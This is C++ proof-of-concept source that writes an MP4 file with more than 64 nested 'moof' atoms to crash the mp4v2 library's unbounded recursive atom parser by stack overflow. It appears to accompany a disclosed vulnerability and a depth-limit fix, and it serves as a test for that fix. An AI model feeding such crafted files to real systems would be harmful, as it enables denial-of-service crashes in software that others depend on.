/*
 * POC: Stack overflow via deeply nested atoms (Vuln #3)
 *
 * Vulnerability: In mp4atom.cpp, ReadChildAtoms() -> ReadAtom() -> Read() ->
 * ReadChildAtoms() is fully recursive with no depth limit. The minimum atom
 * size is 8 bytes, so a small file can nest thousands of levels deep, crashing
 * via stack overflow.
 *
 * This POC generates a minimal MP4 file with >64 levels of nested "moof"
 * container atoms. Each "moof" atom is a known container type (expects "traf"
 * and "mfhd" children), so mp4v2 will descend into it looking for children.
 * By nesting moofs inside moofs, we create arbitrary recursion depth.
 *
 * Structure:
 *   ftyp (20 bytes)
 *   moof
 *     moof
 *       moof
 *         ... (70+ levels deep)
 *
 * Usage:
 *   ./poc_deep_nesting [output_filename] [depth]
 *
 * Then trigger with:
 *   MP4Read(<output_filename>)
 *
 * Expected result (without fix): stack overflow / crash (SIGSEGV or SIGBUS)
 * Expected result (with fix): clean exception, MP4Read returns MP4_INVALID_FILE_HANDLE
 */

#include <cstdio>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>  // htonl

static void write_u32(FILE* f, uint32_t v) {
    v = htonl(v);
    fwrite(&v, 4, 1, f);
}

static void write_fourcc(FILE* f, const char* cc) {
    fwrite(cc, 4, 1, f);
}

static void write_atom_header(FILE* f, uint32_t size, const char* type) {
    write_u32(f, size);
    write_fourcc(f, type);
}

int main(int argc, char** argv)
{
    const char* filename = "poc_deep_nesting.mp4";
    int depth = 70;  /* Must exceed MAX_ATOM_DEPTH (64) to trigger the vulnerability */

    if (argc > 1) {
        filename = argv[1];
    }
    if (argc > 2) {
        depth = atoi(argv[2]);
        if (depth < 1) depth = 70;
    }

    FILE* f = fopen(filename, "wb");
    if (!f) {
        fprintf(stderr, "Failed to open %s for writing\n", filename);
        return 1;
    }

    /*
     * File structure:
     *   ftyp (20 bytes): file type box
     *   moof (nested):   N levels of nested moof containers
     *
     * Each moof atom is 8 bytes of header + its children.
     * The innermost moof contains no children (just the 8-byte header).
     * Each outer moof wraps the inner one, adding 8 bytes per level.
     *
     * Total moof size = 8 * depth (innermost) + 8 * (depth-1) ... 
     * Actually: innermost = 8 bytes, next = 8 + 8 = 16, next = 8 + 16 = 24, ...
     * So total moof size at level i (0-indexed from outside) = 8 * (depth - i)
     * Outermost moof size = 8 * depth
     */

    const uint32_t ftyp_size = 20;
    const uint32_t moof_total_size = 8 * (uint32_t)depth;

    /* Write ftyp atom */
    write_atom_header(f, ftyp_size, "ftyp");
    write_fourcc(f, "isom");  /* major brand */
    write_u32(f, 0x200);     /* minor version */
    write_fourcc(f, "isom");  /* compatible brand */

    /* Write nested moof atoms from outermost to innermost */
    for (int i = 0; i < depth; i++) {
        uint32_t this_moof_size = 8 * (uint32_t)(depth - i);
        write_atom_header(f, this_moof_size, "moof");
    }
    /* The innermost moof has size=8 (just its header, no content/children) */

    fclose(f);

    uint32_t total_file_size = ftyp_size + moof_total_size;
    printf("POC file written: %s (%u bytes)\n", filename, total_file_size);
    printf("\nFile structure:\n");
    printf("  ftyp [%u bytes]\n", ftyp_size);
    printf("  moof (nested %d levels deep) [%u bytes total]\n", depth, moof_total_size);
    printf("\nNesting depth %d exceeds max allowed depth of 64.\n", depth);
    printf("\nTo trigger: call MP4Read(\"%s\")\n", filename);
    printf("Without fix: stack overflow crash (SIGSEGV)\n");
    printf("With fix: throws exception \"atom nesting depth exceeds maximum\"\n");

    return 0;
}
